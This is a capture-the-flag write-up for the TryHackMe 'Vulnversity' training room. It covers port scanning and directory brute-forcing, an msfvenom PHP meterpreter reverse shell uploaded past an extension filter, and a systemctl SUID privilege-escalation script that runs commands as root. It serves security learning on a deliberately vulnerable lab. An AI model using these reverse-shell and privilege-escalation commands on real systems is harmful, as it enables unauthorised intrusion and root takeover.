{"pageProps":{"article":{"title":"TryHackMe - Vulnversity","tags":["CTF","THM"],"date":"2020-09-02","description":"Learn about active recon, web app attacks and privilege escalation.","language":null,"content":[{"Start":{"Heading":["H1",null,[]]}},{"Text":"TryHackMe - Vulnversity"},{"End":{"Heading":["H1",null,[]]}},{"Start":"BlockQuote"},{"Start":"Paragraph"},{"Text":"The room link can be found at"},"SoftBreak",{"Start":{"Link":["Inline","https://tryhackme.com/room/vulnversity",""]}},{"Text":"TryHackMe - Vulnversity"},{"End":{"Link":["Inline","https://tryhackme.com/room/vulnversity",""]}},{"End":"Paragraph"},{"End":"BlockQuote"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Reconnaissance"},{"End":{"Heading":["H2",null,[]]}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Nmap"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"First, we do a simple Nmap scan"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"nmap"}}},{"Text":"PORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3128/tcp open  squid-http\n3333/tcp open  dec-notes\n"},{"End":{"CodeBlock":{"Fenced":"nmap"}}},{"Start":"Paragraph"},{"Text":"We find six ports open, we can now make a more in-depth scan with"},"SoftBreak",{"Code":"nmap -sC -sV $IP"},{"Text":". It will found the service type and version."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"nmap"}}},{"Text":"PORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 3.0.3\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)\n|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)\n|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n3128/tcp open  http-proxy  Squid http proxy 3.5.12\n|_http-server-header: squid/3.5.12\n|_http-title: ERROR: The requested URL could not be retrieved\n3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Vuln University\nService Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s\n|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: vulnuniversity\n|   NetBIOS computer name: VULNUNIVERSITY\\x00\n|   Domain name: \\x00\n|   FQDN: vulnuniversity\n|_  System time: 2020-09-02T14:44:45-04:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-09-02T18:44:46\n|_  start_date: N/A\n"},{"End":{"CodeBlock":{"Fenced":"nmap"}}},{"Start":"Paragraph"},{"Text":"From the OpenSSH version we can find out that the os type is Ubuntu Linux."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Gobuster"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"There is an HTTP port open on "},{"Code":"3333"},{"Text":" so we can start enumerating it."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.232.204:3333/\n[+] Threads:        10\n[+] Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/09/02 20:52:40 Starting gobuster\n===============================================================\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/css (Status: 301)\n/fonts (Status: 301)\n/images (Status: 301)\n/internal (Status: 301)\n/js (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2020/09/02 20:56:58 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"We can see various pages. Visiting them we find that on "},{"Code":"/internal"},{"Text":" there is an"},"SoftBreak",{"Text":"upload form."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"If we run gobuster again on this path we can find a second directory"},"SoftBreak",{"Code":"/internal/uploads/"},{"Text":"."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Exploitation"},{"End":{"Heading":["H2",null,[]]}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Compromise the webserver"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"We start by generating our reverse shell. I chose to use a meterpreter reverse"},"SoftBreak",{"Text":"shell."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msfvenom --payload php/meterpreter/reverse_tcp  LHOST=$USER_IP LPORT=$PORT > payload.php\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Let"},{"Text":"â€™"},{"Text":"s also start the Metasploit console with an "},{"Code":"exploit/multi/handler"},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"Unfortunately if we try to upload it the extension is blocked. If we try the"},"SoftBreak",{"Text":"extensions provided in the image from the challenge, we find that one works. We"},"SoftBreak",{"Text":"can find the uploaded file in the "},{"Code":"/internal/uploads/"},{"Text":" directory that we found"},"SoftBreak",{"Text":"before."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"We now have a shell on the box."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"Now we background the session and use the "},{"Code":"post/linux/gather/enum_system"},{"Text":" to"},"SoftBreak",{"Text":"enumerate the system information, including the user accounts. With the "},{"Code":"loot"},"SoftBreak",{"Text":"command, we can list the gathered items, and at the end of there user list, we"},"SoftBreak",{"Text":"have the "},{"Start":"Strong"},{"Text":"bill"},{"End":"Strong"},{"Text":" user. In his home directory, we can find the user flag which"},"SoftBreak",{"Text":"is readable by "},{"Code":"www-data"},{"Text":" (our user)."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Privilege escalation"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"To gather more information about the box, we can use the "},{"Code":"upload"},{"Text":" command to"},"SoftBreak",{"Text":"upload the"},"SoftBreak",{"Start":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS",""]}},{"Text":"linPEAS"},{"End":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS",""]}},"SoftBreak",{"Text":"script. This will list all the interesting information on the box, including"},"SoftBreak",{"Text":"the SUID binaries. Une of them sticks out, the "},{"Code":"systemctl"},{"Text":" executable that bad"},"SoftBreak",{"Text":"since we can execute and change the state of all the services on the machine"},"SoftBreak",{"Text":"without root privilege. We look up"},"SoftBreak",{"Start":{"Link":["Inline","https://gtfobins.github.io/gtfobins/systemctl/",""]}},{"Text":"systemctl | GTFOBins"},{"End":{"Link":["Inline","https://gtfobins.github.io/gtfobins/systemctl/",""]}},{"Text":" to find"},"SoftBreak",{"Text":"an easy way to exploit it."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"#!/bin/sh\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"cat /root/root.txt > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsystemctl link $TF\nsystemctl enable --now $TF\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"This script will create a temp service file, link, enable, and run it. The"},"SoftBreak",{"Text":"service will be run as root and will cat the flag into the tmp directory that"},"SoftBreak",{"Text":"is readable for us. We could also run a meterpreter reverse shell to gain a"},"SoftBreak",{"Text":"root shell on the box."},{"End":"Paragraph"}]}},"__N_SSG":true}